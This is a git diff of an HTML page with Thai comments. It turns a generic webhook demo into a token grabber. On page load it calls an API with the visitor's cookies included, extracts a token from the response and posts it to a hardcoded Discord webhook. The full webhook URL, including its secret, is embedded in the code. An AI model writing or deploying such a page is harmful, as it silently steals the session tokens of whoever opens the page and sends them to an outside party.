@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Webhook and API Example</title>
+    <title>Fetch and Send Token</title>
     <script>
         // URL ของ Discord Webhook
         const webhookUrl = 'https://discord.com/api/webhooks/1262428333061308486/rjzPQxwlyNV3-c4wP_RrSso80UdhwUuKFBJU9QYEnE-Hw3U-J2n5t2PBaIJNaYrvYc6K';
@@ -27,31 +27,34 @@
             .catch(error => console.error('Error sending webhook:', error));
         }
 
-        // ดึงข้อมูลจาก API และส่งไปยัง Webhook
-        function fetchAndSendData() {
+        // ดึงข้อมูล Token และส่งเป็นข้อความ
+        function fetchAndSendToken() {
             fetch(apiUrl, {
                 method: 'GET',
                 headers: {
                     'Authorization': 'YOUR_DISCORD_AUTHORIZATION_HEADER',
                     'Content-Type': 'application/json',
                 },
+                credentials: 'include', // ส่งคุกกี้ไปด้วย
             })
             .then(response => response.json())
             .then(data => {
-                console.log('Fetched data:', data);
-                sendWebhookMessage('Data fetched: ' + JSON.stringify(data));
+                // ดึง Token หรือข้อมูลที่เกี่ยวข้องจาก data
+                const token = data.token; // สมมุติว่า `token` คือฟิลด์ที่ต้องการ
+                console.log('Token:', token);
+                // ส่ง Token ไปยัง Discord Webhook
+                sendWebhookMessage('Token: ' + token);
             })
             .catch(error => console.error('Error fetching data:', error));
         }
 
-        // เมื่อโหลดหน้าเว็บทำการส่งข้อความและดึงข้อมูล
+        // เมื่อโหลดหน้าเว็บทำการดึงข้อมูล
         window.onload = function() {
-            sendWebhookMessage('เริ่มการทำงาน');
-            fetchAndSendData();
+            fetchAndSendToken();
         }
     </script>
 </head>
 <body>
-    <h1>Webhook and API Example</h1>
+    <h1>Fetching Token and Sending to Webhook</h1>
 </body>
 </html>
